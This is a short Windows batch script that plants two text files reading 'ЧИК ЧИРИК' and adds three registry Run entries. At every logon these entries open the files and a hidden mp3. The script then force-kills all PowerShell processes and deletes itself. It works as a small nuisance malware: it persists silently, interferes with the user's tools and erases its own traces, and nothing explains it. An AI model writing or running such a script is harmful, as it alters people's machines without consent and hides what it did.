@echo off

echo ЧИК ЧИРИК > "C:\Users\Public\chirik1.txt"
echo ЧИК ЧИРИК > "C:\Users\Public\chirik2.txt"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyAudioPlayer" /t REG_SZ /d "cmd.exe /c start /min \"\" \"C:\Users\Public\ri.mp3\"" /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Chirik1" /t REG_SZ /d "cmd.exe /c start \"\" \"C:\Users\Public\chirik1.txt\"" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Chirik2" /t REG_SZ /d "cmd.exe /c start \"\" \"C:\Users\Public\chirik2.txt\"" /f

taskkill /f /im powershell.exe >nul 2>&1
taskkill /f /im pwsh.exe >nul 2>&1
(goto) 2>nul & del "%~f0"
